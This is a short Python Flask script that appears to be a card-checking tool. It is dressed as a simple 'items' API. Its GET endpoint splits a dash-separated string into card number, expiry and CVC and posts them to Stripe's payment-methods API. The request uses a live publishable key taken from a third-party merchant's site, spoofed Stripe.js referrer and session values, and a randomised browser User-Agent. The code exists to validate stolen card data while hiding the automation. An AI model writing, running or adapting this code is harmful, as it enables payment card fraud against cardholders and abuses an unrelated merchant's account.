from flask import Flask, jsonify
import requests as request
import random

app = Flask(__name__)

# Sample data (in-memory database)
items = []

# GET all items
@app.route('/api/items', methods=['GET'])
def get_items():
    return jsonify(items)

# GET single item
@app.route('/api/items/<string:kitu>', methods=['GET'])
def get_item(kitu):
    nlist = kitu.split("-")
    data = f"type=card&card[number]={nlist[0]}&card[cvc]={nlist[3]}&card[exp_year]={nlist[2]}&card[exp_month]={nlist[1]}&allow_redisplay=unspecified&billing_details[address][country]=VN&pasted_fields=number&payment_user_agent=stripe.js%2Ff8ad184067%3B+stripe-js-v3%2Ff8ad184067%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fsmithvillelittleleague.org&time_on_page=56519&client_attribution_metadata[client_session_id]=91f0d936-5de3-4428-9f47-0cd1357aa6ad&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&guid=5e406cae-666c-491e-a42a-4e015d396632983411&muid=febb709b-83a6-43e1-bd62-a1757d1f593f3df06f&sid=0c699097-5ee1-4e4d-ab84-f40716acac39248b6d&key=pk_live_51OctxeJWPL9ZNbRNhPoLAFUyQ9Va0NqbxvJpplzacSF6YItte3vUHvUyjh34IcklHP3JM5xnC7CODJOuXGfnas0Q00MUPtluo5"

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,600)}.{random.randint(1,99)} (KHTML, like Gecko) Chrome/{random.randint(100,150)}.0.0.0 Safari/{random.randint(500,600)}.{random.randint(1,99)}'
        }
    res = request.post("https://api.stripe.com/v1/payment_methods", data=data, headers=headers) 
    return res.json()

if __name__ == '__main__':
    app.run(debug=True)